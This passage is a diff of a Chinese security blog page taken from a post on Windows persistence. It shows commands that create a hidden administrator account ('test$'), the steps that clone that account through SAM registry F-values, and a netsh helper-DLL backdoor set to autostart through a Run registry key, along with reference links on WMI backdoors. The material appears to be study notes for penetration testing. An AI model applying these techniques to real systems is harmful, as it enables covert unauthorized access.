+<p>  <a target="_blank" rel="noopener" href="https://www.tuicool.com/articles/zmUVbyJ">WMI Backdoor</a></p>
+<p>  <a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/appendix-l--events-to-monitor">Appendix L: Events to Monitor</a></p>
+<p>  <a target="_blank" rel="noopener" href="http://demon.tw/copy-paste/vbs-wmi-trojan-3.html">利用WMI打造完美“三无”后门</a></p>
+<p>  <a target="_blank" rel="noopener" href="https://www.tuicool.com/articles/IzieuyR">如何检测并移除WMI持久化后门？</a></p>
+<p>  <a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/85851">解析APT29的无文件WMI和PowerShell后门</a></p>
+<p>  <a target="_blank" rel="noopener" href="https://www.aqniu.com/learn/31053.html">无文件攻击的兴起与应对之道</a></p>
 </blockquote>
-<h1 id="xb.影子用户">0xB.影子用户</h1>
-<p>即创建的隐藏用户，它无法通过普通命令进行查询，比较隐蔽。（要管理员）</p>
+<h1 id="0xB-影子用户"><a href="#0xB-影子用户" class="headerlink" title="0xB.影子用户"></a>0xB.影子用户</h1><p>即创建的隐藏用户，它无法通过普通命令进行查询，比较隐蔽。（要管理员）</p>
 <p>创建个隐藏用户</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net user test$ 123456 /add</span><br><span class="line">net localgroup administrators test$ /add</span><br></pre></td></tr></table></figure>
+
 <p>net user无法查看</p>
-<figure>
-<img src="/2022/03/08/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E5%AD%A6%E4%B9%A0/image-20220308193032710.png" alt="image-20220308193032710"><figcaption aria-hidden="true">image-20220308193032710</figcaption>
-</figure>
+<p><img src="/2022/03/08/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E5%AD%A6%E4%B9%A0/image-20220308193032710.png" alt="image-20220308193032710"></p>
 <p>但是可以在计算机管理和登陆页面中看到</p>
 <p>下面解决这个问题：</p>
 <p>修改<code>HKEY_LOCAL_MACHINE\SAM\SAM</code> admin的权限为完全控制和读取，重新打开后导出3个内容：</p>
-<p>test$导出为1.reg 000003EC包含test$用户的F值，导出另存为2.reg 000003E9包含WIN10用户的F值，导出另存为3.reg</p>
-<figure>
-<img src="/2022/03/08/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E5%AD%A6%E4%B9%A0/image-20220308194155751.png" alt="image-20220308194155751"><figcaption aria-hidden="true">image-20220308194155751</figcaption>
-</figure>
+<p>test$导出为1.reg<br>000003EC包含test$用户的F值，导出另存为2.reg<br>000003E9包含WIN10用户的F值，导出另存为3.reg</p>
+<p><img src="/2022/03/08/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E5%AD%A6%E4%B9%A0/image-20220308194155751.png" alt="image-20220308194155751"></p>
 <p>将2.reg中的F值替换为3.reg中的F值，即将test$用户的F值替换为WIN10用户的F值.</p>
 <p>删除test$用户，之后注册表就 无法打开了，导入1,2注册表：</p>
-<figure>
-<img src="/2022/03/08/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E5%AD%A6%E4%B9%A0/image-20220308194707146.png" alt="image-20220308194707146"><figcaption aria-hidden="true">image-20220308194707146</figcaption>
-</figure>
-<p>这时登陆界面已经没有账户了，3389可以直接登陆，以test<span class="math inline">\(用户登陆，登陆之后的身份是原来WIN10用户，桌面也是原用户的，达到克隆效果。这个时候再用`net user test\)</span> /del`是删除不掉这个用户的，只能通过注册表来删除。</p>
-<h1 id="xc.netsh">0xC.Netsh</h1>
-<p>权限要求：未降权的管理员权限。 netsh也是Windows自带的命令，是用来配置网络的命令行工具。该工具可以通过导入helperdll的方式实现功能，且DLL导入后会写进注册表，永久有效.</p>
+<p><img src="/2022/03/08/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E5%AD%A6%E4%B9%A0/image-20220308194707146.png" alt="image-20220308194707146"></p>
+<p>这时登陆界面已经没有账户了，3389可以直接登陆，以test$用户登陆，登陆之后的身份是原来WIN10用户，桌面也是原用户的，达到克隆效果。这个时候再用<code>net user test$ /del</code>是删除不掉这个用户的，只能通过注册表来删除。</p>
+<h1 id="0xC-Netsh"><a href="#0xC-Netsh" class="headerlink" title="0xC.Netsh"></a>0xC.Netsh</h1><p>权限要求：未降权的管理员权限。<br>netsh也是Windows自带的命令，是用来配置网络的命令行工具。该工具可以通过导入helperdll的方式实现功能，且DLL导入后会写进注册表，永久有效.</p>
 <p>关于<code>helper dll</code>的编写可以参考这个项目：<a target="_blank" rel="noopener" href="https://github.com/outflanknl/NetshHelperBeacon">NetshHelperBeacon</a></p>
 <p>注册表位置：<code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NetSh</code></p>
-<p>netsh并不会开启自启动，因此还要再写一条自启动项： <code>reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run" /v Pentestlab /t REG_SZ /d "cmd /c C:\Windows\System32\netsh"</code></p>
+<p>netsh并不会开启自启动，因此还要再写一条自启动项：<br><code>reg add &quot;HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run&quot; /v Pentestlab /t REG_SZ /d &quot;cmd /c C:\Windows\System32\netsh&quot;</code></p>
 <blockquote>
-<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/9718">Windows权限维持总结</a></p>
-<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8095">Windows权限维持整理</a></p>
-<p><a target="_blank" rel="noopener" href="https://bypass007.github.io/Emergency-Response-Notes/privilege/">权限维持篇</a></p>
-<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/6461">windows中常见后门持久化方法总结</a></p>
+<p>  <a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/9718">Windows权限维持总结</a></p>
+<p>  <a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8095">Windows权限维持整理</a></p>
+<p>  <a target="_blank" rel="noopener" href="https://bypass007.github.io/Emergency-Response-Notes/privilege/">权限维持篇</a></p>
+<p>  <a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/6461">windows中常见后门持久化方法总结</a></p>
 </blockquote>
 
     </article>
@@ -832,7 +813,7 @@
                 <div class="toc-catalog">
                     <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
                 </div>
-                <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#x1-%E8%BE%85%E5%8A%A9%E5%8A%9F%E8%83%BD%E9%95%9C%E5%83%8F%E5%8A%AB%E6%8C%81"><span class="toc-number">1.</span> <span class="toc-text">0x1 辅助功能镜像劫持</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#x2.%E5%90%AF%E5%8A%A8%E9%A1%B9%E6%9C%8D%E5%8A%A1%E5%90%8E%E9%97%A8"><span class="toc-number">2.</span> <span class="toc-text">0x2.启动项&#x2F;服务后门</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BC%80%E5%A7%8B%E8%8F%9C%E5%8D%95%E5%90%AF%E5%8A%A8%E9%A1%B9"><span class="toc-number">2.1.</span> <span class="toc-text">开始菜单启动项</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%90%AF%E5%8A%A8%E9%A1%B9%E6%B3%A8%E5%86%8C%E8%A1%A8%E5%90%8E%E9%97%A8"><span class="toc-number">2.2.</span> <span class="toc-text">启动项注册表后门</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%87%AA%E5%90%AF%E5%8A%A8%E6%9C%8D%E5%8A%A1%E5%90%8E%E9%97%A8"><span class="toc-number">2.3.</span> <span class="toc-text">自启动服务后门</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#x3.%E7%B3%BB%E7%BB%9F%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E5%90%8E%E9%97%A8"><span class="toc-number">3.</span> <span class="toc-text">0x3.系统计划任务后门</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#x4.dll%E5%8A%AB%E6%8C%81"><span class="toc-number">4.</span> <span class="toc-text">0x4.DLL劫持</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#x5.winlogon%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E5%88%9D%E5%A7%8B%E5%8C%96"><span class="toc-number">5.</span> <span class="toc-text">0x5.Winlogon用户登录初始化</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#x6.logon-scripts%E5%90%8E%E9%97%A8"><span class="toc-number">6.</span> <span class="toc-text">0x6.Logon Scripts后门</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#x7.%E6%96%87%E4%BB%B6%E5%85%B3%E8%81%94"><span class="toc-number">7.</span> <span class="toc-text">0x7.文件关联</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#x8.bitsadmin"><span class="toc-number">8.</span> <span class="toc-text">0x8.Bitsadmin</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#x9.%E5%B1%8F%E5%B9%95%E4%BF%9D%E6%8A%A4%E7%A8%8B%E5%BA%8F"><span class="toc-number">9.</span> <span class="toc-text">0x9.屏幕保护程序</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#xa-wmi%E6%9E%84%E9%80%A0%E6%97%A0%E6%96%87%E4%BB%B6%E5%90%8E%E9%97%A8%E5%BE%85%E5%AE%8C%E6%88%90"><span class="toc-number">10.</span> <span class="toc-text">0xA WMI构造无文件后门（待完成）</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#xb.%E5%BD%B1%E5%AD%90%E7%94%A8%E6%88%B7"><span class="toc-number">11.</span> <span class="toc-text">0xB.影子用户</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#xc.netsh"><span class="toc-number">12.</span> <span class="toc-text">0xC.Netsh</span></a></li></ol>
+                <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x1-%E8%BE%85%E5%8A%A9%E5%8A%9F%E8%83%BD%E9%95%9C%E5%83%8F%E5%8A%AB%E6%8C%81"><span class="toc-number">1.</span> <span class="toc-text">0x1 辅助功能镜像劫持</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x2-%E5%90%AF%E5%8A%A8%E9%A1%B9-x2F-%E6%9C%8D%E5%8A%A1%E5%90%8E%E9%97%A8"><span class="toc-number">2.</span> <span class="toc-text">0x2.启动项&#x2F;服务后门</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BC%80%E5%A7%8B%E8%8F%9C%E5%8D%95%E5%90%AF%E5%8A%A8%E9%A1%B9"><span class="toc-number">2.1.</span> <span class="toc-text">开始菜单启动项</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%90%AF%E5%8A%A8%E9%A1%B9%E6%B3%A8%E5%86%8C%E8%A1%A8%E5%90%8E%E9%97%A8"><span class="toc-number">2.2.</span> <span class="toc-text">启动项注册表后门</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%87%AA%E5%90%AF%E5%8A%A8%E6%9C%8D%E5%8A%A1%E5%90%8E%E9%97%A8"><span class="toc-number">2.3.</span> <span class="toc-text">自启动服务后门</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x3-%E7%B3%BB%E7%BB%9F%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E5%90%8E%E9%97%A8"><span class="toc-number">3.</span> <span class="toc-text">0x3.系统计划任务后门</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x4-DLL%E5%8A%AB%E6%8C%81"><span class="toc-number">4.</span> <span class="toc-text">0x4.DLL劫持</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x5-Winlogon%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E5%88%9D%E5%A7%8B%E5%8C%96"><span class="toc-number">5.</span> <span class="toc-text">0x5.Winlogon用户登录初始化</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x6-Logon-Scripts%E5%90%8E%E9%97%A8"><span class="toc-number">6.</span> <span class="toc-text">0x6.Logon Scripts后门</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x7-%E6%96%87%E4%BB%B6%E5%85%B3%E8%81%94"><span class="toc-number">7.</span> <span class="toc-text">0x7.文件关联</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x8-Bitsadmin"><span class="toc-number">8.</span> <span class="toc-text">0x8.Bitsadmin</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x9-%E5%B1%8F%E5%B9%95%E4%BF%9D%E6%8A%A4%E7%A8%8B%E5%BA%8F"><span class="toc-number">9.</span> <span class="toc-text">0x9.屏幕保护程序</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0xA-WMI%E6%9E%84%E9%80%A0%E6%97%A0%E6%96%87%E4%BB%B6%E5%90%8E%E9%97%A8%EF%BC%88%E5%BE%85%E5%AE%8C%E6%88%90%EF%BC%89"><span class="toc-number">10.</span> <span class="toc-text">0xA WMI构造无文件后门（待完成）</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0xB-%E5%BD%B1%E5%AD%90%E7%94%A8%E6%88%B7"><span class="toc-number">11.</span> <span class="toc-text">0xB.影子用户</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0xC-Netsh"><span class="toc-number">12.</span> <span class="toc-text">0xC.Netsh</span></a></li></ol>
             </div>
         
         <!-- sidebar -->
@@ -1766,6 +1747,11 @@
                 PWN
             </span>
         
+            <span class="sidebar-tag-name" data-tags="WEB">
+                <span class="iconfont-archer">&#xe606;</span>
+                WEB
+            </span>
+        
             <span class="sidebar-tag-name" data-tags="RE">
                 <span class="iconfont-archer">&#xe606;</span>
                 RE
@@ -1776,24 +1762,19 @@
                 BUU刷题
             </span>
         
-            <span class="sidebar-tag-name" data-tags="WEB">
-                <span class="iconfont-archer">&#xe606;</span>
-                WEB
-            </span>
-        
             <span class="sidebar-tag-name" data-tags="Java">
                 <span class="iconfont-archer">&#xe606;</span>
                 Java
             </span>
         
-            <span class="sidebar-tag-name" data-tags="内网">
-                <span class="iconfont-archer">&#xe606;</span>
-                内网
-            </span>
-        
             <span class="sidebar-tag-name" data-tags="免杀">
                 <span class="iconfont-archer">&#xe606;</span>
                 免杀
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="内网">
+                <span class="iconfont-archer">&#xe606;</span>
+                内网
             </span>
         
             <span class="sidebar-tag-name" data-tags="VulnHub">
@@ -1826,14 +1807,14 @@
                 Linux
             </span>
         
-            <span class="sidebar-tag-name" data-tags="OS">
-                <span class="iconfont-archer">&#xe606;</span>
-                OS
-            </span>
-        
             <span class="sidebar-tag-name" data-tags="汇编">
                 <span class="iconfont-archer">&#xe606;</span>
                 汇编
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="OS">
+                <span class="iconfont-archer">&#xe606;</span>
+                OS
             </span>
         
             <span class="sidebar-tag-name" data-tags="WriteUp">
